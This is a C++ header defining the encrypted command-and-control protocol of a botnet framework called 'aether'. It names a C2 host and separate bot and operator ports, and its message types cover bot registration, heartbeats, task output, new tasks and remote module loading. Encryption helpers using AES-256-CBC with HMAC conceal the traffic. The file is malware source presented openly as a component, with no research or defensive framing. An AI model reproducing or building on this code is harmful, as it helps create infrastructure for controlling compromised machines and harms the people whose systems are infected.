
#ifndef PROTOCOL_HPP
#define PROTOCOL_HPP

#include <cstdint>
#include <string>
#include <vector>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>

namespace aether {

    // --- C2 Configuration ---
    const std::string C2_HOST = "127.0.0.1";
    constexpr int C2_BOT_PORT = 4444;
    constexpr int C2_OP_PORT = 6666;

    // --- Protocol Constants ---
    constexpr int RSA_KEY_BITS = 2048;
    constexpr int AES_KEY_BITS = 256;
    constexpr int AES_IV_SIZE = 16; // AES block size is 128 bits (16 bytes)
    constexpr int HMAC_SIZE = 32; // SHA256

    // --- Message Structure ---
    // [Header] [IV] [Encrypted Data] [HMAC]
    struct Header {
        uint32_t length; // Length of the entire message (Header + IV + Encrypted Data + HMAC)
        uint8_t type;
    };

    // --- Message Types (Client -> Server) ---
    constexpr uint8_t MSG_C2S_REGISTER = 0x01;
    constexpr uint8_t MSG_C2S_HEARTBEAT = 0x02;
    constexpr uint8_t MSG_C2S_TASK_OUTPUT = 0x03;

    // --- Message Types (Server -> Client) ---
    constexpr uint8_t MSG_S2C_REG_ACK = 0x10;
    constexpr uint8_t MSG_S2C_NEW_TASK = 0x11;
    constexpr uint8_t MSG_S2C_LOAD_MODULE = 0x12;

    // --- Serialization / Deserialization Helpers ---
    inline std::vector<char> serialize_string(const std::string& str) {
        return std::vector<char>(str.begin(), str.end());
    }

    inline std::string deserialize_string(const std::vector<char>& bytes) {
        return std::string(bytes.begin(), bytes.end());
    }

    // --- Cryptography Helpers ---

    // Encrypts data using AES-256-CBC and signs with HMAC-SHA256
    inline std::vector<char> encrypt_and_sign(const std::vector<char>& plaintext, const unsigned char* key) {
        // 1. Generate random IV
        unsigned char iv[AES_IV_SIZE];
        if (!RAND_bytes(iv, sizeof(iv))) {
            return {}; // Error
        }

        // 2. Encrypt
        EVP_CIPHER_CTX *ctx;
        std::vector<char> ciphertext(plaintext.size() + AES_BLOCK_SIZE);
        int len, ciphertext_len;

        if(!(ctx = EVP_CIPHER_CTX_new())) return {};
        if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) return {};
        if(1 != EVP_EncryptUpdate(ctx, (unsigned char*)ciphertext.data(), &len, (const unsigned char*)plaintext.data(), plaintext.size())) return {};
        ciphertext_len = len;
        if(1 != EVP_EncryptFinal_ex(ctx, (unsigned char*)ciphertext.data() + len, &len)) return {};
        ciphertext_len += len;
        EVP_CIPHER_CTX_free(ctx);
        ciphertext.resize(ciphertext_len);

        // 3. Concatenate IV and Ciphertext
        std::vector<char> iv_and_ciphertext;
        iv_and_ciphertext.insert(iv_and_ciphertext.end(), iv, iv + AES_IV_SIZE);
        iv_and_ciphertext.insert(iv_and_ciphertext.end(), ciphertext.begin(), ciphertext.end());

        // 4. Sign with HMAC
        unsigned char hmac[HMAC_SIZE];
        unsigned int hmac_len;
        HMAC(EVP_sha256(), key, AES_KEY_BITS / 8, (const unsigned char*)iv_and_ciphertext.data(), iv_and_ciphertext.size(), hmac, &hmac_len);

        // 5. Concatenate IV + Ciphertext + HMAC
        std::vector<char> final_payload = iv_and_ciphertext;
        final_payload.insert(final_payload.end(), hmac, hmac + hmac_len);

        return final_payload;
    }

    // Verifies HMAC and decrypts data using AES-256-CBC
    inline std::vector<char> verify_and_decrypt(const std::vector<char>& payload, const unsigned char* key) {
        if (payload.size() < AES_IV_SIZE + HMAC_SIZE) {
            return {}; // Invalid payload
        }

        // 1. Extract components
        std::vector<char> iv(payload.begin(), payload.begin() + AES_IV_SIZE);
        std::vector<char> ciphertext(payload.begin() + AES_IV_SIZE, payload.end() - HMAC_SIZE);
        std::vector<char> received_hmac(payload.end() - HMAC_SIZE, payload.end());
        
        // 2. Verify HMAC
        unsigned char calculated_hmac[HMAC_SIZE];
        unsigned int calculated_hmac_len;
        std::vector<char> data_to_verify;
        data_to_verify.insert(data_to_verify.end(), iv.begin(), iv.end());
        data_to_verify.insert(data_to_verify.end(), ciphertext.begin(), ciphertext.end());

        HMAC(EVP_sha256(), key, AES_KEY_BITS / 8, (const unsigned char*)data_to_verify.data(), data_to_verify.size(), calculated_hmac, &calculated_hmac_len);

        if (CRYPTO_memcmp(received_hmac.data(), calculated_hmac, HMAC_SIZE) != 0) {
            return {}; // HMAC verification failed
        }

        // 3. Decrypt
        EVP_CIPHER_CTX *ctx;
        std::vector<char> plaintext(ciphertext.size());
        int len, plaintext_len;

        if(!(ctx = EVP_CIPHER_CTX_new())) return {};
        if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, (const unsigned char*)iv.data())) return {};
        if(1 != EVP_DecryptUpdate(ctx, (unsigned char*)plaintext.data(), &len, (const unsigned char*)ciphertext.data(), ciphertext.size())) return {};
        plaintext_len = len;
        if(1 != EVP_DecryptFinal_ex(ctx, (unsigned char*)plaintext.data() + len, &len)) return {};
        plaintext_len += len;
        EVP_CIPHER_CTX_free(ctx);
        plaintext.resize(plaintext_len);

        return plaintext;
    }

} // namespace aether

#endif // PROTOCOL_HPP
